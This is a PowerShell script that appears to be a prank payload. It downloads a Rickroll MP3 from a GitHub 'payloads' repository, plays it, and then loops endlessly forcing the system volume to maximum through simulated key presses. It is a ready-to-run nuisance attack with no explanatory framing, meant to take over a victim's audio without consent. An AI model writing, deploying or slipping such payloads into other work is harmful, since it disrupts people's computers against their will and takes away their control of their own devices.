Function Set-SoundVolume 
{
    Param(
        [Parameter(Mandatory=$true)]
        [ValidateRange(0,100)]
        [Int]
        $volume
    )

    # Calculate number of key presses. 
    $keyPresses = [Math]::Ceiling( $volume / 2 )
    
    # Create the Windows Shell object. 
    $obj = New-Object -ComObject WScript.Shell
    
    # Set volume to zero. 
    1..50 | ForEach-Object {  $obj.SendKeys( [char] 174 )  }
    
    # Set volume to specified level. 
    for( $i = 0; $i -lt $keyPresses; $i++ )
    {
        $obj.SendKeys( [char] 175 )
    }
}

Function playMp3
{
	param([string]$Path = "")
	try {
	if ($Path -eq "" ) { $Path = read-host "Enter the path to the MP3 sound file" }

	if (-not(test-path "$Path" -pathType leaf)) { throw "Can't access sound file: $Path" }
	$FullPath = (get-childItem $Path).fullname
	$Filename = (get-item "$FullPath").name

	add-type -assemblyName PresentationCore
	$MediaPlayer = new-object System.Windows.Media.MediaPlayer

	do {
		$MediaPlayer.open($FullPath)
		$Milliseconds = $MediaPlayer.NaturalDuration.TimeSpan.TotalMilliseconds
	} until ($Milliseconds)

	[int]$Minutes = $Milliseconds / 60000
	[int]$Seconds = ($Milliseconds / 1000) % 60
	"▶️ Playing $Filename for $($Minutes.ToString('00')):$($Seconds.ToString('00')) sec..."
	$PreviousTitle = $host.ui.RawUI.WindowTitle 
	$host.ui.RawUI.WindowTitle = "▶️ $Filename"
	$MediaPlayer.Volume = 1
	$MediaPlayer.play()
	start-sleep -milliseconds $Milliseconds
	$MediaPlayer.stop()
	$MediaPlayer.close()
	$host.ui.RawUI.WindowTitle = $PreviousTitle

	exit 0 # success
	} catch {
		"⚠️ Error in line $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
		exit 1
	}
}

Invoke-WebRequest "https://github.com/bogoch/payloads/blob/main/never-gonna-give-you-up-official-music-video.mp3?raw=true" -OutFile rick.mp3
Start-Sleep -Seconds 10
playMp3 rick.mp3

While (1)
{
	
	Set-SoundVolume 100
}


